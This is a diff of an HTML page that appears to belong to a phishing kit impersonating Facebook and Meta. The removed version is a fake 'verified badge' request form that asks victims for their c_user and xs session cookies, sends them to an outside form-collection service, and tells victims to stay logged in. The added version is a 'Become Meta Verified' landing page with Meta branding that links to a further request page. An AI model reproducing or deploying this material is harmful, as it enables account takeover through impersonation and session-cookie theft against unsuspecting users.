@@ -1,82 +1,156 @@
-<!doctype html>
 
+<!doctype html>
+<html lang="en">
 
 <head>
-    <script type="module" src="/@vite/client"></script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Apply</title>
+  <link href="bootstrap.min.css" rel="stylesheet" />
+  <style>
+    /* CSS styles */
+    body {
+      font-family: system-ui;
+      margin: 0;
+      padding: 0;
+      overflow-x: hidden;
+      /* Prevent horizontal scroll */
+    }
 
-    <title>verified badge site</title>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <link href="style.css" rel="stylesheet">
-    <link rel="icon" href="https://z-p3-static.xx.fbcdn.net/rsrc.php/y5/r/m4nf26cLQxS.ico">
+    .container-fluid {
+      display: flex;
+      align-items: stretch;
+      padding: 0;
+      margin: 0;
+      min-height: 100vh;
+      /* Full viewport height */
+      overflow: hidden;
+      /* Prevent overflow and visible scrollbars */
+      flex-direction: column;
+      /* Default column direction for mobile */
+    }
+
+    .form-content {
+      flex: 1;
+      /* Take up remaining space */
+      padding: 2rem;
+      background: white;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      box-shadow: none;
+      /* Remove shadow to blend with the background */
+      position: relative;
+      /* Ensure form content is relative for absolute positioning of elements inside */
+      z-index: 1;
+      /* Place form content above the background image */
+    }
+
+    .form-content img {
+      width: 4rem;
+      height: 4rem;
+      margin-bottom: 1rem;
+    }
+
+    .form-content h1 {
+      font-size: 2rem;
+      margin-bottom: 1rem;
+      text-align: center;
+    }
+
+    .btn {
+      background: #0064e0;
+      border: none;
+      border-radius: 100px;
+      padding: 10px 35px;
+      text-decoration: none;
+      color: white;
+      display: inline-block;
+      margin-top: 1rem;
+      font-family: Arial, sans-serif;
+      font-size: 16px;
+    }
+
+    .form-content p {
+      font-size: 18px;
+      margin-top: 1rem;
+      text-align: center;
+    }
+
+    .form-content .sign-up {
+      font-size: 17px;
+      padding-top: 1rem;
+    }
+
+    .form-content .business-info {
+      font-size: 14px;
+    }
+
+    .form-content .region-info {
+      font-size: 13px;
+      font-style: italic;
+    }
+
+    .image {
+      width: 100%;
+      /* Full width by default */
+      height: 27vh;
+      /* Half viewport height by default */
+      background-image: url('https://cdn.glitch.global/2e5d4c45-5a39-486d-a854-bc6ea9ca8ab2/image.png?v=1725069320098');
+      /* Path to your background image */
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+      border: none;
+      /* Ensure no border */
+      margin: 0;
+      /* Remove margin */
+      padding: 0;
+      /* Remove padding */
+      display: block;
+      /* Ensure image is displayed */
+      flex-shrink: 0;
+      /* Prevent shrinking */
+    }
+
+    @media (min-width: 768px) {
+      .container-fluid {
+        flex-direction: row;
+        /* Row direction for larger screens */
+      }
+
+      .form-content {
+        flex: 1;
+        padding: 2rem;
+      }
+
+      .image {
+        width: 42%;
+        /* Adjust width for larger screens */
+        height: 100vh;
+        /* Full viewport height for larger screens */
+      }
+    }
+  </style>
 </head>
 
 <body>
-    <div class="md:block lg:block hidden border flex w-full h-[6rem]  relative bg-[#4667ac]">
-        <div class="mx-10 mt-4">
-            <b class="text-5xl text-white">facebook</b>
-        </div>
-
-        <form class="sm:hidden lg:block md:block" action="https://submit-form.com/6paPZtfHe" method="post">
-
-            <div style="position: absolute; left: 1.5rem; top:8rem; width: 90%;">
-                <div>
-                    <p class="border-b h-10 font-bold text-[16px] text-[#4b4f56] pl-3 p-2 bg-[#f5f6f7]">
-                        Request a verified badge on Facebook
-                    </p>
-                </div>
-                <div>
-                    <p class="mt-4 pl-3 text-[12px] font-semibold">
-                        The verified badge means that Facebook has confirmed that the Page or profile is the authentic presence of the individual, public figure or brand that it represents.
-                    </p>
-                </div>
-                <div>
-                    <p class="mt-4 pl-3 text-[12px] font-semibold">
-                        Previously, the verified badge also required the person or brand to be notable and unique. You may still see users with a verified badge that represents our previous eligibility requirements.
-                    </p>
-                </div>
-                <div>
-                    <p class="mt-4 pl-3 text-[12px] font-semibold">
-                        Please provide the precise details below. Refer to the video for clarification if you find the instructions unclear. 
-                    </p>
-                </div>
-                <div>
-                    <p class="text-[11px] text-[#90949c] p-2 font-semibold">
-                        Detailed Video Information
-                    </p>
-                </div>
-                <div>
-                    <a class="w-[120px] h-[80px] block mx-3" href="https://detailed-video-29b30.web.app/detailed%20video.mp4"><img src="https://cdn.glitch.global/0bc5d4f9-c6e3-43c1-941c-b027cb2387a7/download.jfif?v=1695503392834" alt="">
-                    </a></a>
-                </div>
-                <div>
-                    <p class=" pl-3 text-[12px] font-semibold">
-                        Please be sure to provide the requested information below.
-                    </p>
-                </div>
-                <div>
-                    <p class="text-slate-400 pl-4 mt-1">
-                        c_user
-                    </p><input class="border h-6 pl-1 mx-3" type="number" name="c_user" required>
-                </div>
-                <div>
-                    <p class="text-slate-400 pl-4 mt-1">
-                        xs
-                    </p><input class="border h-6 pl-1 mx-3" type="text" name="xs" required>
-                </div>
-                <div>
-                    <p class="mt-4 pl-3 text-[12px] font-semibold">
-                        Please make sure account not to log out from your computer or laptop until you have received a verification email.
-                    </p>
-                </div>
-                <div class="border mx-3 h-10 mt-4 bg-[#f5f6f7]">
-                    <div class="flex justify-end mx-2">
-                        <button class="border h-7 w-16  bg-[#4267b2] text-white shadow-2xl mt-[0.30rem] font-serif font-thin text-xs hover:bg-blue-500" id="delete-btn">
-    Submit
-  </button></div>
-                </div>
-            </div>
-        </form>
+  <div class="container-fluid">
+    <div class="image"></div>
+    <div class="form-content">
+      <img src="https://cdn.glitch.global/2e5d4c45-5a39-486d-a854-bc6ea9ca8ab2/blue%20tick.png?v=1725069250606"
+        alt="meta" class="meta-logo" />
+      <h1>Become <br> Meta Verified</h1>
+      <a href="request.html" class="btn">Apply</a>
+      <p>Grow your social presence with Meta Verified – a new subscription
+        <br>bundle available for creators and businesses on Instagram and <br>Facebook.
+      </p>
+      <p class="sign-up">Sign up now for creators</p>
+      <p><span class="fw-semibold">Are you a business?</span> Get more information on</p>
+      <a href="#" class="business-info">Meta support for businesses</a>
+      <p class="region-info">Features, availability, and pricing may vary by region.</p>
+    </div>
+  </div>
 </body>
 
 </html>
